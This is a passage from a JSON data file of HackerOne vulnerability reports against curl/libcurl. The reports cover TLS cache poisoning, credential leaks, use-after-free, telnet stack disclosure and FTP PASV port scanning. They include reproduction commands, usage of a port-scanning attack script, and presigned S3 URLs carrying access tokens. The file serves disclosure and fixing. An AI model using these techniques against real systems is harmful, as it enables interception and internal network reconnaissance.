`temp[]` size. The reason for that is in the `check_telnet_options()` where option arguments are truncated to 255 characters, and at least half of that must part of the defined variable name or value.\n\n<https://github.com/curl/curl/blob/curl-7_77_0/lib/telnet.c#L799-L800>"
},
{
    "url": "https://hackerone.com/reports/1223565",
    "original_report": "Summary:\n--------\n\n`Curl_ssl_config_matches` attempts to compare whether two SSL connections have identical SSL security options or not. The idea is to avoid reusing a connection that uses less secure, or completely different security options such as capath, cainfo or certificate/issuer pinning.\n\nUnfortunately this function has several flaws in it:\n\n1. It completely fails to take into account \"BLOB\" type certificate values, such as set by `CURLOPT_CAINFO_BLOB` and `CURLOPT_ISSUERCERT_BLOB`. If the application can be made to initiate connection to a user specified location (where these BLOB options are not used) before the \"more secure\" connection using these options is made, the attacker can point the application to connect to the same address and port, effectively poisoning the connection cache with a connection that has been established with different cainfo or issuecert settings. This leads to attacker being able to neutralize these options and make libcurl ignore them for the connections for which they're set. I have no obvious CWE number for this one, but [CWE-664](/hacktivity/cwe_discovery?id=cwe-664) `Improper Control of a Resource Through its Lifetime` might fit.\n2. `CURLOPT_ISSUERCERT` value is not matched. Similar to above.\n3. Similarly, the function has an implementation flaw where path names use case-insensitive comparison for capath, cainfo and pinned public key paths. This can lead to a situation where if the attacker can specify the capath, cainfo or pinned public key name that have a different path capitalization. Again, if the attacker can specify some of these values for the connection that is performed before the later supposedly secure connection is made, the attacker is able to make the further connection use incorrect capath, cainfo or pinned public key. This is [CWE-41](/hacktivity/cwe_discovery?id=cwe-41) `Improper Resolution of Path Equivalence`.\n4. Finally, the pinned public key fingerprint set by `CURLOPT_PINNEDPUBLICKEY` `sha256//` is incorrectly compared as case-insenstive value. If the attacker is able to create a otherwise valid certificate that has a fingerprint that has the same fingerprint string but with different capitalization (very difficult to pull off in practice), and the application could be tricked to use this value for `CURLOPT_PINNEDPUBLICKEY` and create a connection, later connection could be confused to think that the pinned public key is the same one.\n\nExploiting any of these issues requires a situation where the attacker can coax the application to create a TLS connection to the same host and port that will be performed by the application itself later on (for example some backend connection or other high security connection the attacker wishes to man in the middle). In these situations the existing connection with less security guarantees may be reused, allowing man in the middle attacks against the later supposedly secure connection, resulting in loss of confidentiality and integrity. Since this requires an active attack it can't be thought to have direct availability impact. In most cases where this would result in exploitation would be scenarios where there would be a privilege barrier between the user providing the connection target addresses (lower priority) and the libcurl using application performing the actual connections (higher priority). It can also be exploitable in a scenario where the attacker will try to man in the middle connections performed by other users of the same service (lateral attack towards users at the same privilege level).\n\nExploiting the first two issues is plausible in a situation where the attacker can obtain a valid certificate for the host, but from issuer that doesn't match what the application pinning will check for. If the app uses the blob variants to set up pinning and the attacker is able to obtain a certificate for the specific host from for example Let's Encrypt, the \"pin stripping\" attack would be plausible.\n\nExploiting the 3rd issue is be possible in a situation where the attacker can write to a location that has the same path but with a different capitalization. One example of such situation would be an application that uses a `/tmp`, `/dev/shm` or similar sticky world writable location to store the capath/cainfo/pinned public key file. The attacker would then be able to use the same location but with different file name capitalization to fool the application to reuse the existing connection for later connections that actually would use a different capath, cainfo or pinned public key. This attack requires that the attacker can provide the options for capath, cainfo or the public cert pinning somehow (the application would need to enable this as part of its normal functionality).\n\nSteps To Reproduce:\n-------------------\n\nThis proof of concept demonstrates the 3rd issue with the curl tool:\n\n1. `cp /etc/ssl/certs/ca-certificates.crt ca.crt`\n2. `touch CA.crt`\n3. `curl --capath /dev/null --cacert $PWD/ca.crt https://curl.se --next --capath /dev/null --cacert $PWD/CA.crt https://curl.se`\n\nIf `Curl_ssl_config_matches` comparison is implemented correctly the 2nd connection should fail.\n\nProposed Fix:\n-------------\n\nIn Curl\\_ssl\\_config\\_matches:\n\n* Add \"blob\" binary matching for `CURLOPT_CAINFO_BLOB` and `CURLOPT_ISSUERCERT_BLOB`\n* Add case-sensitive matching for `CURLOPT_ISSUERCERT` value\n* Use case-sensitive matching for paths and public key cert signature(s)\n* Ensure that there are no other SSL parameters that are improperly compared or omitted from the equivalence check\n\nImpact\n------\n\nTLS man in the middle"
},
{
    "url": "https://hackerone.com/reports/1234760",
    "original_report": "Summary:\n--------\n\nlibcurl Secure Transport SSL backend fails to secure the `CURLOPT_SSLCERT` against current directory file overriding the keychain nickname specified.\n\nThis leads to the possibility of locally created file overriding the `CURLOPT_SSLCERT` specified certificate and thus causing denial of service.\n\nSteps To Reproduce:\n-------------------\n\n1. Configure and build curl against Secure Transport: `configure --with-secure-transport && make`\n2. Have keychain with client certificate called \"testcert\"\n3. Use testcert from keychain to authenticate: `./src/curl -E testcert https://testsite`\n4. In current directory execute `touch testcert`\n5. Try authenticating again `./src/curl -E testcert https://testsite`\n\n`curl: (58) SSL: Can't load the certificate \"testcert\" and its private key: OSStatus -50`\n\nThe issue stems from the fact that Secure Transport backend code doesn't seem to prefer the keychain over the local file. The documentation says that local file should be prefixed with \"./\" when used, but the code doesn't have any such checks. Interestingly NSS SSL backend does have the check: <https://github.com/curl/curl/blob/master/lib/vtls/nss.c#L432>\n\nThe impact of this vulnerability is rather limited: In practice it seems to be only usable in causing denial of service against applications using keychain client certificates. It could happen in practice for example if executing command in /tmp directory structure or home directory of another user. The user would be able to prevent the app from creating an authenticated connection by creating a file with matching name used for the keychain nickname used by the app.\n\nImpact\n------\n\nDenial of service"
},
{
    "url": "https://hackerone.com/reports/1213181",
    "original_report": "Summary:\n--------\n\nWhen compiled `--with-libmetalink` and used with `--metalink` and `--user` curl will use the credentials for any further transfers performed. This includes different hosts and protocols, even ones without transport layer security such as `http` and `ftp`. As a result the credentials only intended for the target site may end up being sent to outside hosts, and without transport layer security, and may be intercepted by attackers in man in the middle network position.\n\nFor example HTTP redirects will not leak the credentials to other hosts unless if `--location-trusted` is used, thus this is unexpected and insecure behaviour.\n\nSteps To Reproduce:\n-------------------\n\n1. Configure libcurl `--with-libmetalink` and build libcurl\n2. Have metalinktest.xml with `<url>` referencing data on different host than testsite and using `http` protocol\n3. Execute: `curl --metalink --user professor:Joshua https://testsite/metalinktest.xml`\n\nThe credentials can be seen by the target host and anyone in man in the middle position:\n`Authorization: Basic cHJvZmVzc29yOkpvc2h1YQ==`\n\nRemarks\n-------\n\n[CWE-200](/hacktivity/cwe_discovery?id=cwe-200) (Exposure of Sensitive Information to an Unauthorized Actor) might be a more accurate CWE.\n\nFix\n---\n\n* Perhaps `--location-trusted` should be extended to apply to `--metalink` as well\n\nImpact\n------\n\nLeak of credentials to unauthorized parties§"
},
{
    "url": "https://hackerone.com/reports/1213175",
    "original_report": "Summary:\n--------\n\nWhen compiled `--with-libmetalink` and used with `--metalink` curl does check the cryptographics hash of the downloaded files. However, the only indication that the hash was incorrect is a message displayed to the user. The files with incorrect hashes are left to the disk as-is.\n\nSince curl implements the hash validation and reports incorrect hashes there might be an expectation that files with incorrect hashes would not be kept either. Since the metalink can be used with insecure protocols such as http and ftp, the hash validation might be used an actual way to verify the download integrity against tampering.\n\nSteps To Reproduce:\n-------------------\n\n1.Configure libcurl `--with-libmetalink` and build libcurl\n2. Have metalinktest.xml with `<file name=\"testfile\">` containing incorrect sha-256 hash for it.\n3. Execute: `curl --metalink https://testsite/metalinktest.xml`\n\nThe following message will be displayed:\n`Metalink: validating (testfile) [sha-256] FAILED (digest mismatch)`\n\nYet, the downloaded file `testfile` with incorrect hash mismatch is kept.\n\nFix\n---\n\nIt might be more sensible to download the file to a temporary name first, verify the hash and only then store the file to final name if the hash is correct. If hash mismatch is found remove the temporary file.\n\nImpact\n------\n\nModified or tampered files are kept and possibly incorrectly assumed valid"
},
{
    "url": "https://hackerone.com/reports/1180380",
    "original_report": "Summary:\n--------\n\nlib/vtls/openssl.c `ossl_connect_step1` sets up the `ossl_new_session_cb` sessionid callback with `SSL_CTX_sess_set_new_cb`, and adds association from `data_idx` and `connectdata_idx` to current `conn` and `data` respectively:\n\n...\n\nWhenever the `ossl_new_session_cb` callback is called the code fetches the `conn` and `data` associated via:\n\nHowever, it is possible that the connection is disassociated from these pointers via `Curl_detach_connnection`, and reassociated to a different connection via `Curl_attach_connnection`. Yet, `Curl_detach_connnection` doesn't `SSL_set_ex_data` the `data_idx` / `connectdata_idx`/ to NULL, nor does `Curl_attach_connnection` update the pointers with new ones. I am not absolutely certain but this appears to lead to a situation where a stale pointer(s) can exists when the session callback is called.\n\nSteps To Reproduce:\n-------------------\n\nUnfortunately I currently have no easy to way reproduce this issue. I might attempt to do this later.\n\nNotes\n-----\n\nThis issue is currently lacking information but includes what I believe is the potential root cause of the issue. This information might be wrong or lacking necessary details to make full determination of the validity of this issue at this time.\n\nThis issue seems to be occurring somewhat periodically when webkit browser is built with the libcurl backend. Typically this is a rare use case, I know of only Sony Playstation devices that use in larger scale.\n\nImpact\n------\n\nUse after free, with potential for (remote(\\*)) code execution as `ossl_new_session_cb` calls `Curl_ssl_sessionid_lock(data);` with potentially repurposed memory. Attacker would need to control `data->share` pointer to attacker controller memory. This fake `struct Curl_share` would need to be crafted in a way that `if(share->specifier & (1<<type))` is taken. `share->lockfunc` would then get called by the function, resulting in code execution.\n\n\\*) caveat here, as it is unknown if external attacker can trigger this situation. It would be difficult, but cannot be completely ruled out."
},
{
    "url": "https://hackerone.com/reports/1176461",
    "original_report": "Summary:\n--------\n\nlib/telnet.c `suboption` function incorrecly checks for the `sscanf` return value. Instead of checking that 2 elements are parsed, the code also continues if just one element matches:\n`if(sscanf(v->data, \"%127[^,],%127s\", varname, varval)) {`\nAs such it is possible to construct environment values that don't update the `varval` buffer and instead use the previous value. In combination of advancing in the `temp` buffer by `strlen(v->data) + 1`, this means that there will be uninitialized gaps in the generated output `temp` buffer. These gaps will contain whatever stack contents from previous operation of the application.\n\nFortunately the environment is controlled by the client and not the server. As such this vulnerability can't be exploited by the server. Practical exploitation is limited by the following requirements:\n\n* attacker is able to control the environment passed to libcurl via `CURLOPT_TELNETOPTIONS` (\"`NEW_ENV=xxx,yyy`\") and control `xxx` and `yyy` in the curl\\_slist entries)\n* attacker is able to either inspect the network traffic of the telnet connection or to select the server/port the connection is established to\n\nWhen both are true the attacker is able to some content of the stack. Note however that for this leak to be meaningful, some confidential or sensitive information would need to be leaked. This could happen if some key or other sensitive material (that is otherwise out of the reach of the attacker, due to for example setuid + dropping of privileges, or for example only being able to execute the command remotely in a limited fashion, for example php curl, or similar) would thus become visible fully, or partially. The leak is limited to maximum about half of the 2048 byte `temp` buffer.\n\nSteps To Reproduce:\n-------------------\n\n1. Run telnet service\n2. tcpdump -i lo -X -s 65535 port 23\n3. Execute\n\nYou'll see something like:\n\nFix\n---\n\nImpact\n------\n\nLeak of potentially confidential information."
},
{
    "url": "https://hackerone.com/reports/1172857",
    "original_report": "Summary:\n--------\n\n[Commit \"schannel: support selecting ciphers\"](https://github.com/curl/curl/commit/9aefbff30d280c60fc9d8cc3e0b2f19fc70a2f28) added support for selecting the ciphers with SCHANNEL. However, due to use of a static `algIds` array for ciphers in `set_ssl_ciphers` the last configured cipher list will override configuration used by other connections, leading to potential wrong configuration for them. This may have security implications if insecure cipher configuration is used where secure cipher configuration is expected.\n\nSteps To Reproduce:\n-------------------\n\n1.Create two or more separate curl handles with `curl_easy_init`\n2. Set different cipher lists with `curl_easy_setopt` `CURLOPT_SSL_CIPHER_LIST` to the curl handles\n3. Create simultaneous connections with there the separate curl handles\n\nInstead of each connection using the specific cipher list some of them will share the wrong configuration. If/how this happens exactly depends on how the connection setup overlaps.\n\nNote that to be vulnerable some existing application using libcurl would needs to use such mixed `CURLOPT_SSL_CIPHER_LIST` configuration with multiple curl handles to begin with. It is not really known how likely this really is, but it seems somewhat rare use case.\n\nSupporting Material/References:\n-------------------------------\n\n* Commit adding the vulnerable feature: <https://github.com/curl/curl/commit/9aefbff30d280c60fc9d8cc3e0b2f19fc70a2f28>\n\nImpact\n------\n\nPotentially wrong cipher configuration used for connections."
},
{
    "url": "https://hackerone.com/reports/1129529",
    "original_report": "Summary:\n--------\n\n(I don't think that this can be easily exploitable, but I am submitting it as a security issue for precaution. I am not looking for a bounty.)\n\nCommit [549310e907e82e44c59548351d4c6ac4aaada114](https://github.com/curl/curl/commit/549310e907e82e44c59548351d4c6ac4aaada114) enables session resumption with TLS 1.3. Curl connections maintain two SSL contexts, one for the proxy and one for the destination. However, curl incorrectly stores session tickets issued by an TLS 1.3 HTTPS proxy under the non proxy context.\n\nThe issue is that the logic inside `Curl_ssl_addsessionid` that chooses which context to store the tickets under is incorrect under TLS 1.3.\n\nOne of the major differences between how TLS session tickets are issued between TLS 1.3 and prior versions of TLS is that TLS 1.3 issues session tickets in a *post* handshake message. What this means in practice is that TLS 1.3 tickets are delivered in the first call to `SSL_read()`, rather than being issued as part of `SSL_connect()`. Consequently, `CONNECT_PROXY_SSL()` will see that the proxy has already been connected (since the call to `SSL_connect()` to the proxy was completed), so the call to `Curl_ssl_addsessionid` believes the `isProxy` is `false`, and it stores the ticket under the non proxy context.\n\nAfter the `CONNECT` call returns successfully, a connection to the original destination will be made through the established TCP tunnel. If the original destination uses https, another TLS handshake will be made. During this TLS handshake, the curl client offers the session ticket of the *proxy* to the destination.\n\nIf the proxy is malicious, at this point it could decide to terminate the TLS handshake to the upstream. Since the proxy has the corresponding session ticket key (it was the entity that issued the ticket, after all), it can complete the client -> destination TLS handshake through a resumption. Normally, this would result in a full man in the middle, as TLS certificates are not exchanged as part of a resumed connection. However, curl already performs some of its own certificate validation outside of OpenSSL in `ossl_connect_step3`, which largely mitigates this vulnerability.\n\nThe certificate validation that curl performs includes steps such as (1) checking if the certificate was self signed and (2) ensuring that the certificate contains a subject that matches the destination. The certificate of the proxy is stored in the `SSL_SESSION` that was used for resumption, so curl will attempt to perform these validations against the proxy certificate.\n\nSteps To Reproduce:\n-------------------\n\nI've attached a reproducer in this report.\n\n* `server_that_fails_on_ticket.c` is a simple TLS server (listening on port 12345) that will send an alert if it receives a session resumption attempt. Under normal circumstances, curl should never be sending a ticket when connecting through a proxy, since it has never connected to this destination before. With this bug, you should be able to observe that the server receives a ticket on the first connection regardless.\n* `https_proxy.c` is a extremely rudimentary implementation of a HTTPS proxy (listening on port 12346), that only uses TLS 1.3. If a special proxy header `Mitm: 1` is passed, then the proxy will attempt to terminate the TLS connection itself, acting as a man in the middle.\n* `proxy_ca.pem` is the CA file that signs the proxy cert, `haxx.se.pem`\n* `haxx.se.pem` is the TLS certificate that the proxy uses. Notice that it has the identities: `localhost` and`haxx.se`.\n\nDemonstrating that curl sends the proxy ticket to the original destination.\n---------------------------------------------------------------------------\n\n1. Run `server_that_fails_on_ticket`. This will listen on port 12345\n2. Run `https_proxy`. This will listen on port 12346\n3. Run `curl --proxy-cacert proxy_ca.pem -x 'https://localhost:12346' 'https://localhost:12345'`\n4. Notice that the curl client receives a TLS alert, and that \"Received a TLS 1.3 ticket resumption attempt\" is printed on the server.\n\nDemonstrating the very limited MiTM possibility.\n------------------------------------------------\n\n1. Run `https_proxy`. This will listen on port 12346\n2. Run `curl --proxy-cacert proxy_ca.pem --proxy-header 'Mitm: 1' -x 'https://localhost:12346' 'https://haxx.se'`\n3. Notice that \"MITM\" is returned, and no certificate error is thrown.\n\nThe MITM is only possible because `haxx.se` is listed as one of the subjects in the proxy certificate. Curl's certificate validation passes: (1) the proxy cert is not self signed and (2) the name haxx.se is present in the certificate is \"presented\" by the original destination.\n\nImpact\n------\n\nIn a very specific environment (perhaps a corporate environment where all access to the internet requires going through an HTTPS proxy), an attacker that can issue a trusted proxy certificate may be able to man in the middle connections established with libcurl, even if curl explicitly does not include the proxy CA in the trust store for normal destinations."
},
{
    "url": "https://hackerone.com/reports/1101882",
    "original_report": "Summary:\n--------\n\nWhen using the `--referer ';auto'` feature the current URL is copied as-is to the referrer header of the subsequent request. The recommendation [1] is to strip these (along with the URL fragment). I can imagine this may, in rare cases, result in unwanted/unexpected disclosure of credentials (e.g. them appearing in 3rd party web server logs), though the overall chances seem low (also considering that ';auto', by hunch, is likely not a widely used curl feature).\n\n[1] <https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referer#directives>\n\nSteps To Reproduce:\n-------------------\n\nSupporting Material/References:\n-------------------------------\n\nPatch that fixes it\n-------------------\n\nI'm ready to continue this in a public PR if it seems more fitting.\n\nImpact\n------\n\nThe best I can think of is if an attacker gets hold of web server logs that includer referrer info with credentials leaked into them. It's a privacy/sensitive info-leak vulnerability at best. Can't readily think of a way to actively exploit this."
},
{
    "url": "https://hackerone.com/reports/1086259",
    "original_report": "hi cURL team\n\nI am not entirely sure this is an issue, please feel free to close of it isn't.\n\nI noticed that when making an HTTP GET request with Proxy-Authorization header, together with the \"-L\" flag to follow redirects\n\ncurl -H \"Authorization-Proxy: Basic xxx==\" http://host:8000 -L\n\nIf the remote web server redirects to an alternate host/port, cURL will carry over the Proxy-Authorization header to the redirected new host along with the secret.\n\nIf Authorization header is used (vs Proxy-Authentication) then the header gets stripped as it should.\n\nClient sends GET request with Proxy-Authorization header to Server 1:8080\nServer1 Redirects cURL to Server2:8081\nServer2:8081 Receives the Proxy-Authorization header\nThis was reproducible in the following version:\n\ncurl 7.64.1 (x86\\_64-apple-darwin20.0) libcurl/7.64.1 (SecureTransport) LibreSSL/2.8.3 zlib/1.2.11 nghttp2/1.41.0\nRelease-Date: 2019-03-27\n\nI believe the expected behaviour is that Proxy-Authorization header should be stripped upon a server redirection, since its not within the same domain origin.\n\nI also noticed a similar issue was opened 3 years ago regarding Authorization header: <https://curl.se/docs/CVE-2018-1000007.html>\n\nImpact\n------\n\nIf the password is sent via HTTPS, the server may redirect it to over unencrypted protocols if sent to an HTTP web server, making the Interception of the password possible."
},
{
    "url": "https://hackerone.com/reports/1113663",
    "original_report": "The application is generating cryptographic keys or key pairs using a short and inadequate length.\nThis application is using the ECB (Electronic Codebook) mode of operation to perform encryption, which is considered semantically insecure.\n\nVulnerable File name :- curl\\_ntlm\\_core.c\nVulnerable line no. 274 :- err = CCCrypt(kCCEncrypt, kCCAlgorithmDES, kCCOptionECBMode, key,\n\nImpact\n------\n\nIf a message with identical blocks is encrypted, an attacker get a certain advantage to have information on plaintext, by only observing CipherText."
},
{
    "url": "https://hackerone.com/reports/1040166",
    "original_report": "Summary:\n--------\n\nThe issue here arises from the fact that curl by default has the option CURLOPT\\_FTP\\_SKIP\\_PASV\\_IP disabled by default.\nAs a result, an attacker controlling the URL used by curl, can perform port scanning on behalf of the server where curl is running.\nThis can be achieved by setting up a custom FTP server that would setup the data channel through the PASV command using the port scanning target IP and port in the PASV connection info.\nOne good target for this issue are web applications vulnerable to SSRF.\n\nSteps To Reproduce:\n-------------------\n\nSo we can differentiate between open, closed and filtered ports with the following:\n\n1. Open ports\n   curl will reply with TYPE after the PASV command\n   example:\n   Received: USER anonymous in 5\n   Received: PASS [ftp@example.com](mailto:ftp@example.com) in 5\n   Received: PWD in 5ms\n   Received: EPSV in 6ms\n   Received: PASV in 6ms\n   **Received: TYPE I in 6ms**\n   Received: SIZE whatever in 5ms\n   Received: RETR whatever in 5ms\n2. Filtered\n   curl will timeout after the PASV command\n   example:\n   Received: USER anonymous in 6\n   Received: PASS [ftp@example.com](mailto:ftp@example.com) in 5\n   Received: PWD in 5ms\n   Received: EPSV in 6ms\n   Received: PASV in 5ms\n   Received: in **1011ms**\n3. Closed\n   curl will close the control channel connection immediately after PASV\n   example:\n   Received: USER anonymous in 6ms\n   Received: PASS [ftp@example.com](mailto:ftp@example.com) in 6ms\n   Received: PWD in 5ms\n   Received: EPSV in 5ms\n   Received: PASV in 5ms\n   Received: in **5ms**\n\nIn the attachments, I have included an ftp server ([ssrf\\_pasvaggresvftp.sh (F1088885)](https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/5stnrp5l29x7kuae8vof5efeqea9?response-content-disposition=attachment%3B%20filename%3D%22ssrf_pasvaggresvftp.sh%22%3B%20filename%2A%3DUTF-8%27%27ssrf_pasvaggresvftp.sh&response-content-type=application%2Fx-shellscript&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ7E3XDNSI%2F20250927%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250927T030342Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEA8aCXVzLXdlc3QtMiJIMEYCIQDc%2FGVnvWQv7c%2FzgdwHAWju%2Bn8E%2BI2gAFGtx%2BQ%2FcV6jiQIhAPKzyUrtzODARDwbb%2Fv09KUQS%2FUB%2BndMHbKn4b%2F%2BjkJuKrsFCJj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgxUy34YentMjijS3bMqjwVJ7oJl7%2ByrnAHqOr%2BV4gKbX0R5pb5Kz%2Fia%2BFAeZB3jrxJGo%2B3pYECNaOSXnlbXA%2F%2B8oAnuxpT5N%2B%2BDTW43ILhIPNVqn8a3CDxBbS39b9sncrrxpBFn0zqGMN9TCARrQ7s5a6CJeToph61bZPJbMwn%2FzSsy5wjF7PvLrm6lH3DnXw5ZtOksBt%2FXXRRdkMlH0FQb5%2FcNYb3YqYXwTQS6%2Bk3mIyUXlw5st3Ts1b7TxwdwRa0nnVIyOM7TiSSNoWHsL8GcaO0R2GECknxNh4NLhIWl8dxV06tcz6BzqDR4tqa9fzapiJT2h0WTuIpo%2FwdLMUX16bZZ12sNDkPQuKlrwmPKz0dbAzgNG7mhWlvhIm8mz2D9ESuL4IavVbuAp2I0iuoVo%2BkTXQ3wwNdkpy4SUd5fWcnNcWkj6dwEUmryaSU%2BwHcoBfnUVm3kX1EOaVPEJ2IL758EkW12P8RrkAjLsiPskSfAx3%2BGU5djaHpwaT0ngyPpoP8P2Q7FvoqeVfM%2FRhhWqMttY5Q0%2Fi6u0NIZzVsJEMG5iHDHleGlJ5XdY6BF2gaItYh5FEFXyFH%2FHGFs9w4luUun8kPO8a2XDdRu7i80sSstm9tvBBe3qY1s7JuTw%2BWmbaa4Iu9FsCFLemGlYkJLZyozkENSo94smBwGD%2BhXlIcNDEaqiUidbwtEkrJOiLr%2BhwXU%2BxFTFukDpn5kB1q4S1Hzx5hm12O7lImjerdFFB1kbXl7nGjDEBTU06KnHAK0Eh04crfO6R8Sor1MN8Y7RnMWTmR2dYYM3PPNkGF1uqw0DA3xxjNvxXJGsbAt8h0omNUS%2F6bQTDf2Nng13JvZy8pzLZrxxKsjq%2BtuI4xKPws7Ndy6pnr37n3fXmAYMLOy3MYGOrABG2Rer6hPtsbbYqU5X1HnTaBjVj3dl%2Fb2OhKFUKrG07tfZzd%2BS%2BelqiOsQuuznRfMpE9yXAhE%2FDn07tzMepinatwCmIiBaLm%2FssXSRM1pUnpIkO%2BY%2FUjaUlV%2B%2BIIZg%2BWwlGDCjwHG4O4V%2FiXglBnZYIadooPXAampCvd3bPGPkGGSMxve4ojYhnh6fn72YVBoGl0nB8MuHCSXCiPnWRr9I6k%2FzhvV4%2F6xIlryBFYNmtw%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=61ba11e848cffca7b6f6ab6af150d1f47e0c5710cc62d5098f6a80d170a27199)) that automates these steps.\nUsage:\n./ssrf\\_pasvaggresvftp.sh -t 127.0.0.1/31 -p 80,8000-8100 -x ./ftp\\_curl.sh -vv\n\nthe file included in the -x option is supposed to trigger the ssrf on the target server that would lead to the call of curl with the attacker's URL. In this case we simulate the issue by calling curl locally. The attachment [ftp\\_curl.sh (F1088859)](https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/mr2b6d2ktr0a5ls7ri8zhsezhedz?response-content-disposition=attachment%3B%20filename%3D%22ftp_curl.sh%22%3B%20filename%2A%3DUTF-8%27%27ftp_curl.sh&response-content-type=application%2Fx-shellscript&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ7E3XDNSI%2F20250927%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250927T030342Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEA8aCXVzLXdlc3QtMiJIMEYCIQDc%2FGVnvWQv7c%2FzgdwHAWju%2Bn8E%2BI2gAFGtx%2BQ%2FcV6jiQIhAPKzyUrtzODARDwbb%2Fv09KUQS%2FUB%2BndMHbKn4b%2F%2BjkJuKrsFCJj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgxUy34YentMjijS3bMqjwVJ7oJl7%2ByrnAHqOr%2BV4gKbX0R5pb5Kz%2Fia%2BFAeZB3jrxJGo%2B3pYECNaOSXnlbXA%2F%2B8oAnuxpT5N%2B%2BDTW43ILhIPNVqn8a3CDxBbS39b9sncrrxpBFn0zqGMN9TCARrQ7s5a6CJeToph61bZPJbMwn%2FzSsy5wjF7PvLrm6lH3DnXw5ZtOksBt%2FXXRRdkMlH0FQb5%2FcNYb3YqYXwTQS6%2Bk3mIyUXlw5st3Ts1b7TxwdwRa0nnVIyOM7TiSSNoWHsL8GcaO0R2GECknxNh4NLhIWl8dxV06tcz6BzqDR4tqa9fzapiJT2h0WTuIpo%2FwdLMUX16bZZ12sNDkPQuKlrwmPKz0dbAzgNG7mhWlvhIm8mz2D9ESuL4IavVbuAp2I0iuoVo%2BkTXQ3wwNdkpy4SUd5fWcnNcWkj6dwEUmryaSU%2BwHcoBfnUVm3kX1EOaVPEJ2IL758EkW12P8RrkAjLsiPskSfAx3%2BGU5djaHpwaT0ngyPpoP8P2Q7FvoqeVfM%2FRhhWqMttY5Q0%2Fi6u0NIZzVsJEMG5iHDHleGlJ5XdY6BF2gaItYh5FEFXyFH%2FHGFs9w4luUun8kPO8a2XDdRu7i80sSstm9tvBBe3qY1s7JuTw%2BWmbaa4Iu9FsCFLemGlYkJLZyozkENSo94smBwGD%2BhXlIcNDEaqiUidbwtEkrJOiLr%2BhwXU%2BxFTFukDpn5kB1q4S1Hzx5hm12O7lImjerdFFB1kbXl7nGjDEBTU06KnHAK0Eh04crfO6R8Sor1MN8Y7RnMWTmR2dYYM3PPNkGF1uqw0DA3xxjNvxXJGsbAt8h0omNUS%2F6bQTDf2Nng13JvZy8pzLZrxxKsjq%2BtuI4xKPws7Ndy6pnr37n3fXmAYMLOy3MYGOrABG2Rer6hPtsbbYqU5X1HnTaBjVj3dl%2Fb2OhKFUKrG07tfZzd%2BS%2BelqiOsQuuznRfMpE9yXAhE%2FDn07tzMepinatwCmIiBaLm%2FssXSRM1pUnpIkO%2BY%2FUjaUlV%2B%2BIIZg%2BWwlGDCjwHG4O4V%2FiXglBnZYIadooPXAampCvd3bPGPkGGSMxve4ojYhnh6fn72YVBoGl0nB8MuHCSXCiPnWRr9I6k%2FzhvV4%2F6xIlryBFYNmtw%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=29e82bf36e0ae17cdd8f5717324ecb618c04246061af8877daa0f9985ea39afe) is the script used in the example.\n\nImpact\n------\n\nThrough the port scanning, an attacker could uncover services running in the internal network.\nIt could also be possible to perform version enumeration or other information disclosure if the attacker can get back the results of curl.\nFor example, an attacker points curl at host:22 for the data channel . If an ssh server is running on that host, then it will reply with its version which is then disclosed to the attacker.\n\nUltimately, this issue can be used as a stepping stone to launch further attacks on the vulnerable server."
},
{
    "url": "https://hackerone.com/reports/636013",
    "original_report": "Summary:\n--------\n\nIf an attacker can set environmental variables, curl will always crash with a buffer overflow when downloading a file – if the `--progress-bar` argument is set.\n\nSteps To Reproduce:\n-------------------\n\nJust run the following command on a **64-bit Linux** system (verified on Ubuntu 19.04).\n\n**Output**\n\n**Explanation of the bug**\nThe `progress-bar` feature parses the `COLUMNS` environment variable. The source code aims to guarantee this value to be above 20. However, on Linux systems this check fails due to a faulty integer cast in `tool_cb_prg.c`:\n\nThen on **line 181** we have the buffer overflow:\n\nImpact\n------\n\n**If** a server runs `curl` with the `--progress-bar` argument set **and** (intentionally or unintentionally) allows an attacker to set environmental variables, the server could easily become a victim of a DoS attack."
},
{
    "url": "https://hackerone.com/reports/662412",
    "original_report": "Summary:\n--------\n\n[add summary of the vulnerability]\nOn systems with a 64 bit, if —retry-max-time > 18446744073709552, config->retry-max-time\\*1000L will be overflow at line 1603 in the src/operator.c file. Similarly, the same is true for 32-bit operating systems.\n## Steps To Reproduce:\n[add details for how we can reproduce the issue]\n\n1. [add step]\n   run: curl --retry-max-time 18446744073709552 -v 127.0.0.1:8080/test.html\n2. [add step]\n3. [add step]\n\nSupporting Material/References:\n-------------------------------\n\n[list any additional material (e.g. screenshots, logs, etc.)]\n\n* [attachment / reference]\n\nImpact\n------\n\nIf the integer overflow is triggered, the parameter retry-max-time will be illegal."
},
{
    "url": "https://hackerone.com/reports/694449",
